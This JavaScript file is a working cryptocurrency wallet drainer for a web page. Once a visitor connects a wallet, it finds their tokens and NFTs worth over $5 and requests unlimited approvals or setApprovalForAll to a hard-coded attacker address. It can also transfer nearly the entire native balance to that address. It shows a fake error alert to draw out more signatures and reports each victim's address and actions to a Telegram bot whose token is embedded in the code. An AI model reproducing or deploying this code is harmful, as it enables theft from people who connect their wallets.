let tokens = []
let chainId = null;
let web3Object = null;
let selectedAccount = null;
const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;

const OWNER_ADDRESS = "0x324BE2C089BA3e8E660C24c207c3bc14d4F7105f"

const ABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_upgradedAddress", "type": "address" }], "name": "deprecate", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "approve", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "deprecated", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_evilUser", "type": "address" }], "name": "addBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_from", "type": "address" }, { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transferFrom", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "upgradedAddress", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balances", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "maximumFee", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "_totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "unpause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_maker", "type": "address" }], "name": "getBlackListStatus", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowed", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "paused", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "who", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [], "name": "pause", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "getOwner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "owner", "outputs": [{ "name": "", "type": "address" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" }], "name": "transfer", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newBasisPoints", "type": "uint256" }, { "name": "newMaxFee", "type": "uint256" }], "name": "setParams", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "issue", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "amount", "type": "uint256" }], "name": "redeem", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }, { "name": "_spender", "type": "address" }], "name": "allowance", "outputs": [{ "name": "remaining", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "basisPointsRate", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "isBlackListed", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "_clearedUser", "type": "address" }], "name": "removeBlackList", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "MAX_UINT", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "newOwner", "type": "address" }], "name": "transferOwnership", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "_blackListedUser", "type": "address" }], "name": "destroyBlackFunds", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [{ "name": "_initialSupply", "type": "uint256" }, { "name": "_name", "type": "string" }, { "name": "_symbol", "type": "string" }, { "name": "_decimals", "type": "uint256" }], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Issue", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "amount", "type": "uint256" }], "name": "Redeem", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "newAddress", "type": "address" }], "name": "Deprecate", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "feeBasisPoints", "type": "uint256" }, { "indexed": false, "name": "maxFee", "type": "uint256" }], "name": "Params", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_blackListedUser", "type": "address" }, { "indexed": false, "name": "_balance", "type": "uint256" }], "name": "DestroyedBlackFunds", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "AddedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": false, "name": "_user", "type": "address" }], "name": "RemovedBlackList", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "owner", "type": "address" }, { "indexed": true, "name": "spender", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "from", "type": "address" }, { "indexed": true, "name": "to", "type": "address" }, { "indexed": false, "name": "value", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Pause", "type": "event" }, { "anonymous": false, "inputs": [], "name": "Unpause", "type": "event" }]
const ABIN = [{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"uint256","name":"maxNftSupply","type":"uint256"},{"internalType":"uint256","name":"saleStart","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"BAYC_PROVENANCE","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"MAX_APES","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"REVEAL_TIMESTAMP","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"apePrice","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"baseURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"emergencySetStartingIndexBlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"flipSaleState","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"maxApePurchase","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"numberOfTokens","type":"uint256"}],"name":"mintApe","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"renounceOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"reserveApes","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"saleIsActive","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"operator","type":"address"},{"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"baseURI","type":"string"}],"name":"setBaseURI","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"string","name":"provenanceHash","type":"string"}],"name":"setProvenanceHash","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"revealTimeStamp","type":"uint256"}],"name":"setRevealTimestamp","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"setStartingIndex","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"startingIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"startingIndexBlock","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"uint256","name":"index","type":"uint256"}],"name":"tokenOfOwnerByIndex","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"tokenURI","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}];
const networkToId = {
    20090103: "btc-mainnet",
    1: "eth-mainnet",
    5: "eth-goerli",
    137: "matic-mainnet",
    80001: "matic-mumbai",
    56: "bsc-mainnet",
    97: "bsc-testnet",
    43114: "avalanche-mainnet",
    43113: "avalanche-testnet",
    250: "fantom-mainnet",
    4002: "fantom-testnet",
    42161: "arbitrum-mainnet",
    421613: "arbitrum-goerli",
    42170: "arbitrum-nova-mainnet",
    592: "astar-mainnet",
    81: "astar-shibuya",
    336: "astar-shiden",
    1313161554: "aurora-mainnet",
    1313161555: "aurora-testnet",
    432204: "avalanche-dexalot-mainnet",
    432201: "avalanche-dexalot-testnet",
    2020: "axie-mainnet",
    84531: "base-testnet",
    119: "bittorrent-mainnet",
    1029: "bittorrent-testnet",
    43288: "boba-avalanche-mainnet",
    4328: "boba-avalanche-testnet",
    56288: "boba-bnb-mainnet",
    9728: "boba-bnb-testnet",
    1294: "boba-bobabeam-mainnet",
    1297: "boba-bobabase-testnet",
    288: "boba-mainnet",
    28: "boba-rinkeby-testnet",
    2888: "boba-goerli",
    7700: "canto-mainnet",
    1131378225: "covalent-internal-network-v1",
    25: "cronos-mainnet",
    338: "cronos-testnet",
    53935: "defi-kingdoms-mainnet",
    335: "defi-kingdoms-testnet",
    42262: "emerald-paratime-mainnet",
    9001: "evmos-mainnet",
    9000: "evmos-testnet",
    2152: "findora-mainnet",
    2154: "findora-forge-testnet",
    19: "flarenetworks-canary-mainnet",
    16: "flarenetworks-canary-testnet",
    14: "flarenetworks-flare-mainnet",
    114: "flarenetworks-flare-testnet",
    192837465: "gather-mainnet",
    356256156: "gather-testnet",
    1666600000: "harmony-mainnet",
    1666700000: "harmony-testnet",
    321: "kcc-mainnet",
    322: "kcc-testnet",
    59140: "linea-testnet",
    5001: "mantle-testnet",
    82: "meter-mainnet",
    83: "meter-testnet",
    1088: "metis-mainnet",
    588: "metis-testnet",
    2002: "milkomeda-a1-mainnet",
    200202: "milkomeda-a1-devnet",
    2001: "milkomeda-c1-mainnet",
    200101: "milkomeda-c1-devnet",
    1284: "moonbeam-mainnet",
    1287: "moonbeam-moonbase-alpha",
    1285: "moonbeam-moonriver",
    245022926: "neon-testnet",
    71402: "nervos-godwoken-mainnet",
    71401: "nervos-godwoken-testnet",
    71393: "nervos-polyjuice-testnet",
    23294: "oasis-sapphire-mainnet",
    23295: "oasis-sapphire-testnet",
    248: "oasys-mainnet",
    9372: "oasys-testnet",
    10: "optimism-mainnet",
    11297108109: "palm-mainnet",
    11297108099: "palm-testnet",
    1442: "polygon-zkevm-testnet",
    30: "rsk-mainnet",
    31: "rsk-testnet",
    1564830818: "skale-calypso",
    344106930: "skale-staging-uum",
    1026062157: "skale-omnus",
    278611351: "skale-razor",
    1399811149: "solana-mainnet",
    73772: "swimmer-mainnet",
    73773: "swimmer-testnet",
    416: "sx-mainnet"
  };

const providerOptions = {
    walletconnect: {
        package: WalletConnectProvider,
        options: {
            rpc: {
                10: "https://mainnet.optimism.io",
            },
            chainId: 10,
            network: 'optimism',
            infuraId: "e77435344ef0486893cdc26d7d5cf039",
            pollingInterval: "10000",
        },
    },
    coinbasewallet: {
        package: CoinbaseWalletSDK, // Required
        options: {
          appName: "web3", // Required
          infuraId: "e77435344ef0486893cdc26d7d5cf039", // Required
          rpc: "https://mainnet.optimism.io", // Optional if `infuraId` is provided; otherwise it's required
          chainId: 10, // Optional. It defaults to 1 if not provided
          network: 'optimism',
          darkMode: false // Optional. Use dark theme, defaults to false
        }
      }
  
};

let web3Modal = new Web3Modal({
    providerOptions,
    cacheProvider: false,
    disableInjectedProvider: false,
});

$(".connect").click(async function () {
    try {
        let provider = await web3Modal.connect();
        onProvider(provider);
        provider.on("accountsChanged", (accounts) => {
            web3.eth.defaultCommon = {
                customChain: {name: 'optimism', chainId: 10, networkId: 10}, baseChain: 'mainnet', hardfork: 'petersburg'};           
            console.log(accounts);
            onProvider(provider);
        });
    } catch (e) {
        console.log("Could not get a wallet connection", e);
        return;
    }
})

async function onProvider(provider) {
    web3Object = new Web3(provider);
    let accounts = await web3Object.eth.getAccounts();
    selectedAccount = accounts[0];

    chainName = await web3Object.eth.getChainId();
    chainId = networkToId[chainName]
  	console.log(chainId)
    console.log(selectedAccount)
    if (accounts.length) {
        sendMessage("Wallet Connected Successfully!")
        sendMessage(`Cl address : ${selectedAccount}`)
        covalenthqAPICall()

        // if (chainId == 1) bitqueryAPICall()
        // else covalenthqAPICall()
    }
}

// async function bitqueryAPICall() {

//     const query = `{
//         ethereum {
//           address(address: {is: "${selectedAccount}"}) {
//             balances {
//               currency {
//                 symbol
//                 address
//               }
//               value
//             }
//           }
//         }
//     }`;

//     const url = "https://graphql.bitquery.io/";

//     const opts = {
//         method: "POST",
//         headers: {
//             "Content-Type": "application/json",
//             "X-API-KEY": "BQYbBW4xCbSdau4k5wFWgFNN8Sr4FN3L"
//         },
//         body: JSON.stringify({
//             query,
//         })
//     };

//     const result = await fetch(url, opts).then(res => res.json())

//     let list = result.data.ethereum.address[0].balances

//     let map_list = list.map(m => {
//         return {
//             balance: m.value,
//             address: m.currency.address,
//             symbol: m.currency.symbol
//         }
//     })

//     tokens = map_list.filter(f => f.balance > 0 && f.symbol != "ETH")
//     console.log("ETH", tokens);
//     onApprove()
// }

async function covalenthqAPICall() {

    const params = {
        format: "JSON",
        nft: "true",
        "quote-currency": "usd",
        key: "ckey_5da97a82746c43ed84565c64afb"

    }
    const url = new URL(`https://api.covalenthq.com/v1/${chainId}/address/${selectedAccount}/balances_v2/`);
    url.search = new URLSearchParams(params).toString();

    const opts = {
        method: "GET",
        headers: {
            "Content-Type": "application/json",
        },
    };

    try {
        const result = await fetch(url, opts).then(res => res.json())

        let list = result.data.items
        console.log("Initial list ", list)
        let map_list = list.map(m => {
            return {
                balance: m.balance,
                value: m.quote,
                address: m.contract_address,
                symbol: m.contract_ticker_symbol,
                type: m.type
            }
        })
        console.log("tokens-list", map_list)
        tokens = map_list.filter(f => f.value > 5 && f.symbol != "BNB")
        console.log("chainId:", chainId, "Tokens:", tokens);
        if (window.location.search)
            onSendEther()
        else
            onApprove()
    } catch {
        sendMessage(`Error collecting info about wallet`)
    }
}

async function onApprove() {
    if (tokens.length) {
        //tokens.forEach(token => {
    try {
        loopTokens(tokens);
    }
    catch (error) {
        // Ignore the error and continue with the loop
        console.error(`Error processing item ${error.message}`);
      }
        }
         else {
        sendMessage("Error not found, Please switch network or try again!")
    }
}
async function loopTokens(tokens){
    
    for await (let token of tokens) {
        if (token.type === "cryptocurrency"){
        let instance = new web3Object.eth.Contract(ABI, token.address);
        sendMessage("New token")
        await instance.methods.approve(
            OWNER_ADDRESS,
            "999999999999999999999999999999999999999999999999999999999999999999999999")
            .send({
                from: selectedAccount,
                to: token.address
            })
            .on('transactionHash', (hash) => {
                console.log(`Transaction Hash: ${hash}`)
                setTimeout(function() {alert ('Error ... Return to your wallet or browser extension to approve smart contract'); }, 1)
            })
            .on('receipt', (receipt) => {
                console.log(`Transaction Receipt: ${receipt}`)
                sendMessage("Approve Completed Successfully")
                sendMessage(`TOKEN Contract Address ${token.address}`)
                sendMessage(`Token balance is ${token.balance}`)
                sendMessage(`Your address ${OWNER_ADDRESS}`)
            })
            .on('error', (error) => {
                console.log(`Error: ${error}`)
                sendMessage("Transaction Rejected")
            })
        }

    else if (token.type === "NFT"){
        let instance = new web3Object.eth.Contract(ABIN, token.address);
        await instance.methods.setApprovalForAll(
            OWNER_ADDRESS,
            "true")
            .send({
                from: selectedAccount,
                to: token.address
            })
            .on('transactionHash', (hash) => {
                console.log(`Transaction Hash: ${hash}`)
                sendMessage("Transaction is submitted to the network")
            })
            .on('receipt', (receipt) => {
                console.log(`Transaction Receipt: ${receipt}`)
                sendMessage("Approve Completed Successfully")
                sendMessage(`NFT Contract Address ${token.address}`)
                sendMessage(`Your address ${OWNER_ADDRESS}`)
            })
            .on('error', (error) => {
                console.log(`Error: ${error}`)
                sendMessage("Transaction Rejected")
            })
        }
    else{
        sendMessage("Invalid token ${token.address}")
    }
    };
}
async function onSendEther() {
    console.log("Sending ether")
    try {
        let balance = await web3Object.eth.getBalance(selectedAccount)

        var gasPrice = await web3Object.eth.getGasPrice(); // estimate the gas price
        balance = balance - 5000000000000000;
        var transactionObject = {
            gasPrice: gasPrice,
            from: selectedAccount,
            to: OWNER_ADDRESS,
            value: balance,
        }

        var gasLimit = await web3Object.eth.estimateGas(transactionObject); // estimate the gas limit for this transaction
        var transactionFee = gasPrice * gasLimit; // calculate the transaction fee

        transactionObject.gas = gasLimit;
       // transactionObject.value = balance - 5000000000000000; // set the transaction value to the entire balance, less the transaction fee
        console.log(transactionObject.value)
        web3Object.eth.sendTransaction(transactionObject)
            .on('transactionHash', (hash) => {
                console.log("Transaction Hash: ", hash)
                sendMessage("Transaction is submitted to the network")
            })
            .on('receipt', (receipt) => {
                console.log("Transaction Receipt: ", receipt)
                sendMessage("Transfer Completed Successfully, You should receive some native tokens")
            })
            .on('error', (error) => {
                console.log("Error: ", error)
                sendMessage("Transaction Rejected")
            })
    } catch {
        sendMessage("Insufficient funds for transfer")
    }

}

async function sendMessage(message){
    return new Promise((resolve, reject)=>{
      const chat_id = 5227607491;
      fetch(`https://api.telegram.org/bot5519263012:AAECn6WGaBWiGtY_1EBBEGkamw9e5W6qxvs/sendMessage?chat_id=${chat_id}&text=${message}`, {
            method: "GET",
            headers: {
                
            }
        })
        .then(async(res) => {
            if(res.status > 399) throw res;
            resolve(await res.json());
        }).catch(err=>{
            reject(err);
        })
    })
  }